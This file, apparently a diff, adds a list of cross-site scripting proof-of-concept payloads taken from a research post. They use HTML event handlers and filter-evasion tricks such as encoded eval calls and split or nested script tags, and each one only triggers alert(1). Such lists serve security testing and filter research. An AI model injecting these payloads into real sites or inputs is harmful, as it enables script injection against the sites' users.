@@ -1,0 +1,31 @@
+<body onpageshow=alert(1)>  
+<style onload=alert(1) />  
+<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>  
+<marquee loop="1" onfinish=alert(1)>hack the planet</marquee>  
+<marquee onstart=alert(1)>hack the planet</marquee>  
+<audio oncanplay=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio ondurationchange=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio autoplay=true onended=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio onloadeddata=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio onloadedmetadata=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio onloadstart=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio onprogress=alert(1) src="/media/hack-the-planet.mp3" />  
+<audio onsuspend=alert(1) src="/media/hack-the-planet.mp3" />  
+<video oncanplay=alert(1) src="/media/hack-the-planet.mp4" />  
+<video ondurationchange=alert(1) src="/media/hack-the-planet.mp4" />  
+<video autoplay=true onended=alert(1) src="/media/hack-the-planet.mp4" />  
+<video onloadeddata=alert(1) src="/media/hack-the-planet.mp4" />  
+<video onloadedmetadata=alert(1) src="/media/hack-the-planet.mp4" />  
+<video onloadstart=alert(1) src="/media/hack-the-planet.mp4" />  
+<video onprogress=alert(1) src="/media/hack-the-planet.mp4" />  
+<video onsuspend=alert(1) src="/media/hack-the-planet.mp4" />  
+eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))  
+eval(\'~a~le~rt~~(~~1~~)~\'.replace(/~/g, \'\'))  
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))  
+<sc<script>ript>alert(1)</sc</script>ript>  
+<img src=x ononerrorerror=alert(1) />  
+<script NAUGHTY_HACKER>alert(1)</script NAUGHTY_HACKER>  
+
+
+
+Source:: https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/  
